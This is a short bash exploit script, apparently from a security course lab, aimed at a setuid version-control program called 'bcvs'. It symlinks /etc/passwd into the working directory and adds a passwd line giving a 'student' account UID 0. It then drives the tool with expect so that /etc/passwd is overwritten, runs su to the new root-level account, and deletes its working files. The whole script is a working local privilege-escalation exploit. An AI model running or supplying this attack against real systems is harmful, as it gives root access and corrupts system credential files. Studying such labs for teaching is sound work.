#!/bin/bash

cd bcvs
mkdir .bcvs
cd .bcvs
touch block.list
touch passwd
cd ..
ln -s /etc/passwd passwd

PASSWORD=".bcvs/passwd"

echo root:x:0:0::/root:/bin/bash >> $PASSWORD
echo student:x:0:0::/root:/bin/bash >> $PASSWORD

touch expfile.exp
cat <<EOF>> expfile.exp
#!/usr/bin/expect -f
set timeout -1
spawn /opt/bcvs/bcvs co passwd

expect "Please write a SHORT explanation:\r"
send -- "anything\r"
expect eof
EOF

touch expfile2.exp
cat <<EOF>> expfile2.exp
#!/usr/bin/expect -f
set timeout -1
spawn su student
expect "Password:"
send -- "security\r"
interact
expect eof
EOF

chmod +x expfile.exp
chmod +x expfile2.exp
./expfile.exp
./expfile2.exp
rm expfile.exp
rm expfile2.exp
rm passwd
rm -r .bcvs
